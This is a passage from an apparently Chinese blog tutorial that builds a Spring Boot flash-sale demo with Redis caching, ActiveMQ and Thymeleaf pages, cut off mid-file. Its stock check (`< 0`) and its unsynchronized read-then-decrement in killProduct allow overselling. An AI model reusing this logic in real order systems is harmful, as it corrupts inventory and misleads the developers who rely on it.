title="Service层"></a>Service层</h2><p>服务层</p><h3 id="ProductService-java"><a href="#ProductService-java" class="headerlink" title="ProductService.java"></a>ProductService.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ProductService</span> &#123;</span><br><span class="line">    List&lt;AyProduct&gt; <span class="title function_">findAll</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    Collection&lt;AyProduct&gt; <span class="title function_">findAllCache</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    AyProduct <span class="title function_">killProduct</span><span class="params">(Integer productId, Integer userId)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="AyUserKillProductService-java"><a href="#AyUserKillProductService-java" class="headerlink" title="AyUserKillProductService.java"></a>AyUserKillProductService.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">AyUserKillProductService</span> &#123;</span><br><span class="line">    AyUserKillProduct <span class="title function_">save</span><span class="params">(AyUserKillProduct killProduct)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ProductServiceImpl-java"><a href="#ProductServiceImpl-java" class="headerlink" title="ProductServiceImpl.java"></a>ProductServiceImpl.java</h3><p>在该类中注入productRepository和ayUserKillProductService类<br>Service类只能注入自己的Repository</p><p>RedisTemplate 中 opsForHash()使用：<br>entries(H key) ：获取变量中的键值对。<br>putAll(H key, Map&lt;? extends HK,? extends HV&gt; m) ：以map集合的形式添加键值对。<br>put(H key, HK hashKey, HV value) ：新增hashMap值</p><p>redisTemplate.expire：设置缓存过期时间</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProductServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">ProductService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> ProductRepository productRepository;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> AyUserKillProductService ayUserKillProductService;</span><br><span class="line">    <span class="comment">//日志</span></span><br><span class="line">    <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(ProductServiceImpl.class);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询所有商品</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;AyProduct&gt; <span class="title function_">findAll</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            List&lt;AyProduct&gt; ayProducts = productRepository.findAll();</span><br><span class="line">            <span class="keyword">return</span> ayProducts;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            logger.error(<span class="string">&quot;ProductServiceImpl.findAll error&quot;</span>, e);</span><br><span class="line">            <span class="keyword">return</span> Collections.EMPTY_LIST;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//注入redisTemplate对象</span></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> RedisTemplate redisTemplate;</span><br><span class="line">    <span class="comment">//定义缓存key</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KILL_PRODUCT_LIST</span> <span class="operator">=</span> <span class="string">&quot;kill_product_list&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询商品数据（带缓存）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Collection&lt;AyProduct&gt; <span class="title function_">findAllCache</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//从缓存中查询商品数据</span></span><br><span class="line">            Map&lt;Integer, AyProduct&gt; productMap =</span><br><span class="line">                    redisTemplate.opsForHash().entries(KILL_PRODUCT_LIST);</span><br><span class="line">            Collection&lt;AyProduct&gt; ayProducts = <span class="literal">null</span>;</span><br><span class="line">            <span class="comment">//如果缓存中查询不到商品数据</span></span><br><span class="line">            <span class="keyword">if</span>(CollectionUtils.isEmpty(productMap))&#123;</span><br><span class="line">                <span class="comment">//从数据库中查询商品数据</span></span><br><span class="line">                ayProducts = productRepository.findAll();</span><br><span class="line">                <span class="comment">//将商品list转换为商品map</span></span><br><span class="line">                productMap = convertToMap(ayProducts);</span><br><span class="line">                <span class="comment">//将商品数据保存到缓存中</span></span><br><span class="line">                redisTemplate.opsForHash().putAll(KILL_PRODUCT_LIST, productMap);</span><br><span class="line">                <span class="comment">//设置缓存数据的过期时间，这里设置10s，具体时间需要结合业务需求而定</span></span><br><span class="line">                <span class="comment">//如果商品数据变化少，过期时间可以设置长一点；反之，过期时间可以设置短一点</span></span><br><span class="line">                redisTemplate.expire(KILL_PRODUCT_LIST,<span class="number">10000</span> , TimeUnit.MILLISECONDS);</span><br><span class="line">                <span class="keyword">return</span> ayProducts;</span><br><span class="line">            &#125;</span><br><span class="line">            ayProducts = productMap.values();</span><br><span class="line">            <span class="keyword">return</span> ayProducts;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            logger.error(<span class="string">&quot;ProductServiceImpl.findAllCache error&quot;</span>, e);</span><br><span class="line">            <span class="keyword">return</span> Collections.EMPTY_LIST;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * list转换为map</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> ayProducts</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Map&lt;Integer, AyProduct&gt; <span class="title function_">convertToMap</span><span class="params">(Collection&lt;AyProduct&gt; ayProducts)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(CollectionUtils.isEmpty(ayProducts))&#123;</span><br><span class="line">            <span class="keyword">return</span> Collections.EMPTY_MAP;</span><br><span class="line">        &#125;</span><br><span class="line">        Map&lt;Integer, AyProduct&gt; productMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(ayProducts.size());</span><br><span class="line">        <span class="keyword">for</span>(AyProduct product: ayProducts)&#123;</span><br><span class="line">            productMap.put(product.getId(), product);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> productMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> AyProductKillProducer ayProductKillProducer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//队列</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Destination</span> <span class="variable">destination</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ActiveMQQueue</span>(<span class="string">&quot;ay.queue.asyn.save&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 秒杀商品(引入MQ)</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> productId 商品id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> userId 用户id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> AyProduct <span class="title function_">killProduct</span><span class="params">(Integer productId, Integer userId)</span> &#123;</span><br><span class="line">        <span class="comment">//查询商品</span></span><br><span class="line">        <span class="type">AyProduct</span> <span class="variable">ayProduct</span> <span class="operator">=</span> productRepository.findById(productId).get();</span><br><span class="line">        <span class="comment">//判断商品是否还有库存</span></span><br><span class="line">        <span class="keyword">if</span>(ayProduct.getNumber() &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//设置商品的库存：原库存数量 - 1</span></span><br><span class="line">        ayProduct.setNumber(ayProduct.getNumber() - <span class="number">1</span>);</span><br><span class="line">        <span class="comment">//更新商品库存</span></span><br><span class="line">        ayProduct = productRepository.save(ayProduct);</span><br><span class="line">        <span class="comment">//保存商品的秒杀记录</span></span><br><span class="line">        <span class="type">AyUserKillProduct</span> <span class="variable">killProduct</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AyUserKillProduct</span>();</span><br><span class="line">        killProduct.setCreateTime(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">        killProduct.setProductId(productId);</span><br><span class="line">        killProduct.setUserId(userId);</span><br><span class="line">        <span class="comment">//设置秒杀状态</span></span><br><span class="line">        killProduct.setState(KillStatus.SUCCESS.getCode());</span><br><span class="line">        <span class="comment">//保存秒杀记录详细信息</span></span><br><span class="line">        <span class="comment">//ayUserKillProductService.save(killProduct);</span></span><br><span class="line">        <span class="comment">//异步保存商品的秒杀记录</span></span><br><span class="line">        ayProductKillProducer.sendMessage(destination, killProduct);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//商品秒杀成功后，更新缓存中商品库存数量</span></span><br><span class="line">        redisTemplate.opsForHash().put(KILL_PRODUCT_LIST, killProduct.getProductId(),ayProduct);</span><br><span class="line">        <span class="keyword">return</span> ayProduct;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="AyUserKillProductServiceImpl-java"><a href="#AyUserKillProductServiceImpl-java" class="headerlink" title="AyUserKillProductServiceImpl.java"></a>AyUserKillProductServiceImpl.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AyUserKillProductServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">AyUserKillProductService</span> &#123;</span><br><span class="line">    <span class="comment">//注入ayUserKillProductRepository类</span></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> AyUserKillProductRepository ayUserKillProductRepository;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 保存用户秒杀商品记录</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> killProduct</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> AyUserKillProduct <span class="title function_">save</span><span class="params">(AyUserKillProduct killProduct)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ayUserKillProductRepository.save(killProduct);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Controller层"><a href="#Controller层" class="headerlink" title="Controller层"></a>Controller层</h2><h3 id="ProductController-java"><a href="#ProductController-java" class="headerlink" title="ProductController.java"></a>ProductController.java</h3><p>@PathVariable是spring3.0的一个新功能：接收请求路径中占位符的值<br>@RequestParam用于将请求参数区数据映射到功能处理方法的参数上。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/products&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProductController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> ProductService productService;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询所有的商品</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> model</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/all&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">findAll</span><span class="params">(Model model)</span>&#123;</span><br><span class="line">        List&lt;AyProduct&gt; products = productService.findAll();</span><br><span class="line">        model.addAttribute(<span class="string">&quot;products&quot;</span>, products);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;product_list&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查询所有的商品（缓存）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> model</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/all/cache&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">findAllCache</span><span class="params">(Model model)</span>&#123;</span><br><span class="line">        Collection&lt;AyProduct&gt; products = productService.findAllCache();</span><br><span class="line">        model.addAttribute(<span class="string">&quot;products&quot;</span>, products);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;product_list&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 秒杀商品</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> model</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> productId 商品id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> userId  用户id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/&#123;id&#125;/kill&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">killProduct</span><span class="params">(Model model,</span></span><br><span class="line"><span class="params">                              <span class="meta">@PathVariable(&quot;id&quot;)</span> Integer productId,</span></span><br><span class="line"><span class="params">                              <span class="meta">@RequestParam(&quot;userId&quot;)</span> Integer userId)</span>&#123;</span><br><span class="line">        <span class="type">AyProduct</span> <span class="variable">ayProduct</span> <span class="operator">=</span> productService.killProduct(productId, userId);</span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">null</span> != ayProduct)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="View层"><a href="#View层" class="headerlink" title="View层"></a>View层</h2><p>显示层中要展现的图片等静态资源文件统一放在resource目录下的static文件夹中。</p><h3 id="product-list-html"><a href="#product-list-html" class="headerlink" title="product_list.html"></a>product_list.html</h3><p>SpringBoot中采用模板来作为视图层工作，Thymeleaf是基于Html语言的模板引擎，语法应用在Html标签中。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 引入 Bootstrap --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 页面显示部分--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel panel-default&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel-heading text-center&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>秒杀活动<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel-body&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">&quot;table table-hover&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span>图片<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span>名称<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span>库存<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span>开始时间<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span>结束时间<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span>操作<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span> <span class="attr">th:each</span>=<span class="string">&quot;product:$&#123;products&#125;&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">border</span>=<span class="string">&quot;1px&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;110px&quot;</span></span></span><br><span class="line"><span class="tag">                             <span class="attr">th:src</span>=<span class="string">&quot;@&#123;$&#123;product.productImg&#125;&#125;&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;product.name&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;product.number&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;product.startTime&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;product.endTime&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!-- 发起秒杀请求，用户id先简单写死为 1 --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-info&quot;</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;&#x27;/products/&#x27;+$&#123;product.id&#125; + &#x27;/kill&#x27; + &#x27;?userId=1&#x27;&#125;&quot;</span>&gt;</span>秒杀<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- jQuery文件。务必在bootstrap.min.js 之前引入 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcss.com/jquery/2.1.1/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 最新的 Bootstrap 核心 JavaScript 文件 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="success-html"><a href="#success-html" class="headerlink" title="success.html"></a>success.html</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">    客官！！！ 恭喜您，秒杀成功~~~</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="fail-html"><a href="#fail-html" class="headerlink" title="fail.html"></a>fail.html</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span 